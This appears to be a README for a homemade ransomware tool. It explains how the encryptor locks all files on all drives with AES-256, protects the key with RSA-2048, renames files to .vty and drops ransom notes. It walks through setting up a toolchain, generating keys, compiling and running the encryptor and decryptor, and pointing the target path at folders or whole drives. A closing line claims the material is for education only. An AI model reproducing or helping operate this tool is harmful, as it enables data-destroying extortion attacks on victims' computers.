██╗  ██╗ ██████╗  █████╗ ███╗   ██╗██╗   ██╗██╗  ██╗
██║ ██╔╝██╔═══██╗██╔══██╗████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
█████╔╝ ██║   ██║███████║██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
██╔═██╗ ██║   ██║██╔══██║██║╚██╗██║  ╚██╔╝   ██╔██╗ 
██║  ██╗╚██████╔╝██║  ██║██║ ╚████║   ██║   ██╔╝ ██╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
          Malware-RaNSOMWARE
HOW IT WORKS
Generates random 256-byte AES key
Encrypts ALL files on ALL drives with AES-256
Adds .vty extension to encrypted files
Creates ransom notes in every directory
Encrypts the AES key with RSA-2048 public key
Saves encrypted key as encrypted_aes_key.bin
HOW TO USE

STEP 1: Install MSYS2 64-bit
Download from: https://www.msys2.org/
Install to C:\msys64
Open "MSYS2 MINGW64" terminal
Update packages: pacman -Syu
STEP 2: Install OpenSSL in MSYS2
pacman -S mingw-w64-x86_64-openssl
STEP 3: Generate RSA Key Pair
Open MSYS2 terminal and navigate to your working directory:
cd /c/YourFolder

Generate private key (NO PASSWORD - just press Enter):
openssl genrsa -out private_key.pem 2048

Generate public key from private key:
openssl rsa -in private_key.pem -pubout -out public_key.pem
IMPORTANT: Both keys will be created in your CURRENT directory. Make sure:

public_key.pem is in same folder as encryptor.exe

private_key.pem is in same folder as decryptor.exe

STEP 4: Compile the Programs
# Compile encryptor
gcc encryptor.c -o encryptor.exe -lcrypt32 -lws2_32
# Compile decryptor  
gcc decryptor.c -o decryptor.exe -lcrypt32 -lws2_32

STEP 5: RUN ENCRYPTOR
./encryptor.exe
 This encrypts ALL drives and creates ransom notes

STEP 6: RUN DECRYPTOR
./decryptor.exe
 This decrypts ALL .vty files and restores originals


 KEY LOCATIONS (VERY IMPORTANT!)
Based on the code, here's where files MUST be:
FOR ENCRYPTION:
C:\
├── public_key.pem ← MUST BE HERE before running encryptor
└── encryptor.exe

AFTER ENCRYPTION, YOU GET:
C:\
├── encrypted_aes_key.bin ← CREATED HERE
└── (your encrypted files with .vty)

FOR DECRYPTION:
C:\
├── private_key.pem ← MUST BE HERE
├── encrypted_aes_key.bin ← MUST BE HERE (from encryption)
└── decryptor.exe


CHOOSE WHAT TO ENCRYPT (TARGET FOLDER)
In encryptor.c - Change the TARGET PATH:
int main() {
    printBanner();
    // 👇 CHANGE THIS LINE TO YOUR TARGET FOLDER
    // This is WHERE THE FILES TO ENCRYPT ARE LOCATED
    const char* targetPath = "C:\\Users\\YourName\\Documents";
    // EXAMPLES:
    // const char* targetPath = "C:\\RansomTest";           // Specific folder
    // const char* targetPath = "D:\\Projects";             // Different drive
    // const char* targetPath = "E:\\nukrecon";             // Your folder
    // const char* targetPath = ".\\test_files";            // Current directory
    // const char* targetPath = "C:\\";                     // Entire C drive
    // USE THE CODE BELOW FOR ALL DRIVES

    
In decryptor.c - Change the TARGET PATH:
int main() {
    printBanner();
    // 👇 CHANGE THIS LINE TO WHERE YOUR ENCRYPTED FILES ARE
    const char* targetPath = "C:\\Users\\YourName\\Documents"
    // EXAMPLES:
    // const char* targetPath = "C:\\RansomTest";           // Where .vty files are
    // const char* targetPath = "D:\\Projects";             // Different drive
    // const char* targetPath = "E:\\nukrecon";             // Your folder
    DWORD aesKeyLen = 0;
    BYTE* aesKey = decryptAES("C:\\encrypted_aes_key.bin", "C:\\private_key.pem", &aesKeyLen);
⚠️ FOR EDUCATIONAL PURPOSES ONLY - USE IT FOR GOOD! ⚠️
Learn how ransomware works to better defend against it.
Only use in your own virtual machines to understand cybersecurity.
